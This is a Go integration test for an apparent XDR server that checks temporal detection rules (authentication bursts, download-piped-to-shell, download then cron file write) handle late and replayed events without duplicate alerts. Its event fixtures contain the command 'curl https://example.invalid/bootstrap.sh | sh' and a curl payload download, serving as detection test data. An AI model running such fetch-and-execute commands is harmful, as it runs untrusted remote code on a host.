//go:build integration

package ingest

import (
	"context"
	"encoding/json"
	"path/filepath"
	"reflect"
	"testing"
	"time"

	"github.com/google/uuid"
	"openxdr/server/internal/temporal"
)

// 使用仓库发布的基础/时序规则走真实 Processor，而非仅用 marker 条件测内核。
func TestRepositoryTemporalRulesPersistLateReplay(t *testing.T) {
	for _, kind := range []string{"count", "sequence", "account", "signal"} {
		t.Run(kind, func(t *testing.T) {
			p, c, db := testProcessor(t)
			defer c.Close()
			defer db.Close()
			ctx := context.Background()
			group := uuid.New()
			asset := c.Asset.Create().SetHostname("corpus-host").SetOs("linux").SetGroupID(group).SaveX(ctx)
			reload := func() {
				t.Helper()
				store := &temporal.Store{}
				if err := store.Reload(filepath.Join("..", "..", "..", "rules"), filepath.Join("..", "..", "..", "temporal-rules")); err != nil {
					t.Fatal(err)
				}
				p = &Processor{DB: db, Temporal: store, Rules: store, Suppress: p.Suppress, Intel: p.Intel, DedupWindow: p.DedupWindow}
			}
			reload()
			now := time.Now().UTC().Add(-time.Hour).Truncate(time.Microsecond)
			makeEvent := func(n int, class int, raw string) Envelope {
				return Envelope{Version: EnvelopeVersion, ID: uuid.New(), PartitionKey: asset.ID.String(), Timestamp: now.Add(time.Duration(n) * time.Second), ClassUID: class, Source: "agent", AssetID: &asset.ID, AssetOS: "linux", Raw: json.RawMessage(raw)}
			}
			rule := "temporal:linux-auth-burst"
			var events []Envelope
			if kind == "count" {
				for i := 0; i < 5; i++ {
					e := makeEvent(i, 3002, `{"activity_id":1,"status_id":2,"user":{"name":"operator"}}`)
					e.Username = "operator"
					events = append(events, e)
				}
			} else if kind == "account" {
				// 同组三台主机上同一账号的失败认证，单机都不到阈值
				rule = "temporal:linux-account-auth-burst"
				hosts := []uuid.UUID{asset.ID}
				for _, name := range []string{"corpus-host-2", "corpus-host-3"} {
					hosts = append(hosts, c.Asset.Create().SetHostname(name).SetOs("linux").SetGroupID(group).SaveX(ctx).ID)
				}
				for i := 0; i < 5; i++ {
					e := makeEvent(i*60, 3002, `{"activity_id":1,"status_id":2,"user":{"name":"operator"}}`)
					e.AssetID, e.PartitionKey, e.Username = &hosts[i%3], hosts[i%3].String(), "operator"
					events = append(events, e)
				}
			} else if kind == "signal" {
				// 两步都是信号规则：只进候选、不单独告警；共现不论先后，证据按时间排序
				rule = "temporal:linux-download-pipe-shell"
				events = []Envelope{makeEvent(0, 1007, `{"process":{"name":"bash","cmd_line":"bash"}}`), makeEvent(1, 1007, `{"process":{"name":"curl","file":{"path":"/usr/bin/curl"},"cmd_line":"curl -s https://example.invalid/payload.sh"}}`)}
			} else {
				rule = "temporal:linux-download-sensitive-file"
				events = []Envelope{makeEvent(0, 1007, `{"process":{"name":"sh","cmd_line":"curl https://example.invalid/bootstrap.sh | sh"}}`), makeEvent(30, 1001, `{"activity_id":3,"file":{"path":"/etc/cron.d/update"}}`)}
			}
			// 终点先到，再重建处理器/规则快照，逐条补齐前序；重投全部事件不得累计第二次。
			for i := len(events) - 1; i >= 0; i-- {
				if err := p.Process(ctx, events[i]); err != nil {
					t.Fatal(err)
				}
				reload()
			}
			for _, e := range events {
				if err := p.Process(ctx, e); err != nil {
					t.Fatal(err)
				}
			}
			var evidence []byte
			var anchor uuid.UUID
			var count int
			if err := db.QueryRow(`SELECT d.anchor_id,d.evidence,a.count FROM temporal_detections d JOIN alerts a ON a.id=d.alert_id WHERE d.rule_id=$1`, rule).Scan(&anchor, &evidence, &count); err != nil {
				t.Fatal(err)
			}
			var got []uuid.UUID
			if err := json.Unmarshal(evidence, &got); err != nil {
				t.Fatal(err)
			}
			want := make([]uuid.UUID, len(events))
			for i, e := range events {
				want[i] = e.ID
			}
			if anchor != events[len(events)-1].ID || count != 1 || !reflect.DeepEqual(got, want) {
				t.Fatalf("迟到/重投证据错误: anchor=%s count=%d got=%v want=%v", anchor, count, got, want)
			}
			var detections int
			if err := db.QueryRow(`SELECT count(*) FROM temporal_detections WHERE rule_id=$1`, rule).Scan(&detections); err != nil || detections != 1 {
				t.Fatalf("重复命中: %d %v", detections, err)
			}
			if kind == "signal" {
				var signalAlerts int
				if err := db.QueryRow(`SELECT count(*) FROM alerts WHERE rule_id IN ('9fbc3a0d-eb13-4ffa-a540-e9587ecdaa18','fa68888c-1f59-4c51-8409-48c6e0614860')`).Scan(&signalAlerts); err != nil || signalAlerts != 0 {
					t.Fatalf("信号规则单独出了告警: %d %v", signalAlerts, err)
				}
			}
			// 单机五次失败只是主机规则的事；账号规则要求至少两台资产，不重复告警
			if kind == "count" {
				if err := db.QueryRow(`SELECT count(*) FROM temporal_detections WHERE rule_id='temporal:linux-account-auth-burst'`).Scan(&detections); err != nil || detections != 0 {
					t.Fatalf("单机失败触发了账号规则: %d %v", detections, err)
				}
			}
		})
	}
}
